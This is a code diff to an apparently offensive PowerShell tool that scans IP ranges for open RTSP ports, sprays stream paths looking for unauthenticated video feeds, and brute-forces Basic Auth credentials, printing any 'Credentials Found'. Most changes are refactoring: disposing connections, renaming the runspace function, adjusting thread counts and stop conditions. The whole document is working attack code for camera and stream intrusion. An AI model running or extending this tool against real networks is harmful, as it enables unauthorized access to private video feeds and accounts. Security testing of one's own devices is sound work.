@@ -111,7 +111,7 @@ function Get-IpRange {
                     $IPInBinary = $IPInBinary -join ''
                     $HostBits = 32 - $SubnetBits
                     $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)
-                    $HostIDInBinary = '0' * $HostBits
+
                     $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                     For ($i = 1; $i -le $imax; $i++) {
                         $NextHostIDInDecimal = $i
@@ -162,18 +162,22 @@ function PortScan {
                     if ($tcpClient.Connected) {
                         #Port Open
                         $tcpClient.Close()
+                        $tcpClient.Dispose()
                         return "$Target`:$Port"
                     }
                 }
                 catch {
                     #Errorhandling Catch
                     $tcpClient.Close()
+                    $tcpClient.Dispose()
                     return "Error with Connection"
+
                 }
             }
             else {
                 #Port Closed
                 $tcpClient.Close()
+                $tcpClient.Dispose()
                 return "Error with Connection"
             }
         }
@@ -195,7 +199,7 @@ function PortScan {
         return $AlivePorts
 }
 #Function to use Async-Runtimes (Badly) and handle any results from other functions
-function Async-Runspaces {
+function AsyncRunspaces {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
         [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
@@ -206,11 +210,9 @@ function Async-Runspaces {
     )   
     
     #Function Wide Variables  
-    $Threads = 30
-    $Timeout = 100
+    $Threads = 10
     $ReturnedResult = @()
     $Auth200 = $False
-    $NoAuth200 = $False
 
     $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
     $runspacePool.Open()
@@ -220,7 +222,7 @@ function Async-Runspaces {
     #My Weird way of Calling the Scripts/Runtime blocks to be used in this function
     if ($Option -eq "PortScan"){
         PortScan -Target $Target
-    } elseif ($Option -eq "PathAttack" -or $Option -eq "FullPathAttack"){
+    } elseif ($Option -eq "PathAttack" -or $Option -eq "FullAutoAttack"){
         PathAttack -Targets $Target
     } elseif ($Option -eq "AuthAttack"){
         AuthAttack -Targets $Target
@@ -228,13 +230,24 @@ function Async-Runspaces {
 
     # Poll the runspaces and display results as they complete
     do {
-        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed -and -not ($NoAuth200 -or $Auth200) }) {
+        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+            
             if ($runspace.Handle.IsCompleted) {
-                
                 $runspace.Completed = $true
                 $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                 $runspace.Runspace.Dispose()
+
+                # Dispose PowerShell instance if it's not null
+                if ($runspace.PowerShell) {
+                    $runspace.PowerShell.Dispose()
+                }
+
+                $runspaces.Remove($runspace)
                 $runspace.Handle.AsyncWaitHandle.Close()
+
+                # Remove the runspace from the ArrayList and nullify the variable
+                $runspaces.Remove($runspace)
+                $runspace = $null
 
                 if ($result -eq "Error with Connection"){
                     continue
@@ -244,16 +257,20 @@ function Async-Runspaces {
                     $ReturnedResult += $result
 
                 # Handling of the Path Attacking Results:
-                } elseif ($Option -eq "PathAttack" -or $Option -eq "FullPathAttack") {
-                    $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
+                } elseif ($Option -eq "PathAttack" -or $Option -eq "FullAutoAttack") {
+                    
                     if ($result[3] -eq "200"){
+                        $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
                         #Checking for No Authentication on all Paths
                         Write-Host -ForegroundColor Green "No Authentication Required:" $concat
-                        if ($Option -eq "PathAttack"){$NoAuth200 = $True}
-                        
+                        break
+                        #if ($Option -eq "PathAttack"){$NoAuth200 = $True}
+                          
                     } elseif ($result[3] -eq "401" -or $result[3] -eq "403") {
+                        $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
                         #Find any 401's or 403's for Authentication BruteForcing
                         $ReturnedResult += $concat
+                        continue
                     
                     } else {
                         #Should catch and discard any other status codes including 404
@@ -262,13 +279,15 @@ function Async-Runspaces {
 
                 # Handling of the Credential Attacking Results:
                 } elseif ($Option -eq "AuthAttack") {
-                    $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
-                    $foundCreds = $result[4] + ":" + $result[5]
+
                     if ($result[3] -eq "200"){
+                        $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
+                        $foundCreds = $result[4] + ":" + $result[5]
                         #Basic Auth Credentials Found
                         Write-Host -NoNewline -ForegroundColor Green "Credentials Found:" $concat 
                         Write-Host " -> " $foundCreds
                         $Auth200 = $True
+                        break
                     } else {
                         #Should catch and discard any other status codes including 404
                         continue
@@ -278,7 +297,7 @@ function Async-Runspaces {
             }
         }
 
-    Start-Sleep -Milliseconds 100
+    Start-Sleep -Milliseconds 200
     } while ($runspaces | Where-Object { -not $_.Completed -and -not ($NoAuth200 -or $Auth200) })
     
         # Clean up
@@ -359,7 +378,7 @@ function PathAttack {
                                 Start-Sleep -Milliseconds 100
                                 while ($Stream.CanRead) {
                                         $line = $Reader.ReadLine()
-                                    if ($line -eq $null) { break }
+                                    if ($null -eq $line) { break }
                                         $response += $line + $CRLF
                                 }
                             } catch [System.IO.IOException] {
@@ -374,13 +393,20 @@ function PathAttack {
                             $statusCode = ($statusLine -split ' ')[1].Trim()
 
                             $tcpClient.Close()
+                            $tcpClient.Dispose()
+                            $Reader.Dispose()
+                            $Writer.Dispose()
+                            $Stream.Dispose()
+
                             return @($IP, $Port, $Path, $statusCode)
+
                         }
                     }
                     catch {
                         #Errorhandling Catch
                         Write-Host "Error Handling"
                         $tcpClient.Close()
+                        $tcpClient.Dispose()
                         return "Error with Connection"
                     }
                 }
@@ -388,6 +414,7 @@ function PathAttack {
                     #Port Closed
                     Write-Host "Port Closed"
                     $tcpClient.Close()
+                    $tcpClient.Dispose()
                     return "Error with Connection"
                 }
             }
@@ -473,14 +500,12 @@ function AuthAttack {
                                 Start-Sleep -Milliseconds 100
                                 while ($Stream.CanRead) {
                                         $line = $Reader.ReadLine()
-                                    if ($line -eq $null) { break }
+                                    if ($null -eq $line) { break }
                                         $response += $line + $CRLF
                                 }
                             } catch [System.IO.IOException] {
                                 # Catching the exception without taking any action
             
-                                # Debugging: Handle timeout or connection closed gracefully
-                                #Write-Host "Error reading response: $_"
                             }
 
                             #Debugging Line:
@@ -489,13 +514,20 @@ function AuthAttack {
                             $statusCode = ($statusLine -split ' ')[1].Trim()
 
                             $tcpClient.Close()
+                            $tcpClient.Dispose()
+                            $Reader.Dispose()
+                            $Writer.Dispose()
+                            $Stream.Dispose()
+
                             return @($IP, $Port, $Path, $statusCode, $Username, $Password)
+
                         }
                     }
                     catch {
                         #Errorhandling Catch
                         Write-Host "Error Handling"
                         $tcpClient.Close()
+                        $tcpClient.Dispose()
                         return "Error with Connection"
                     }
                 }
@@ -503,6 +535,7 @@ function AuthAttack {
                     #Port Closed
                     Write-Host "Port Closed"
                     $tcpClient.Close()
+                    $tcpClient.Dispose()
                     return "Error with Connection"
                 }
             }
@@ -544,7 +577,7 @@ function AuthAttack {
     if ($Scan){
 
         $IpAddr = Get-IpRange -Target $Scan
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
+        $AlivePorts += AsyncRunspaces -Target $IpAddr -Option "PortScan"
     
         if ($AlivePorts.Length -eq 0){  
             Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
@@ -558,14 +591,14 @@ function AuthAttack {
 
     if ($PathScan){
         $IpAddr = Get-IpRange -Target $PathScan
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
+        $AlivePorts += AsyncRunspaces -Target $IpAddr -Option "PortScan"
 
         if ($AlivePorts){ 
             Write-Host "Open RTSP Ports Found:"
             Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
             Write-Host "Spraying Paths:"
             Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "PathAttack"
+            $PathsToAttack = AsyncRunspaces -Target $AlivePorts -Option "PathAttack"
 
             if ($PathsToAttack){
                 #Print the Possible Paths to the Host
@@ -583,17 +616,17 @@ function AuthAttack {
 
     if ($FullAuto){
         $IpAddr = Get-IpRange -Target $FullAuto
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
+        $AlivePorts += AsyncRunspaces -Target $IpAddr -Option "PortScan"
 
         if ($AlivePorts){ 
             Write-Host "Open RTSP Ports Found:"
             Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
             Write-Host "Spraying Paths and Credentials:"
             Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "FullPathAttack"
+            $PathsToAttack = AsyncRunspaces -Target $AlivePorts -Option "FullAutoAttack"
             if ($PathsToAttack){
                 #Run the AuthAttack function
-                Async-Runspaces -Target $PathsToAttack -Option "AuthAttack"
+                AsyncRunspaces -Target $PathsToAttack -Option "AuthAttack"
             } else {
                 Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
             }
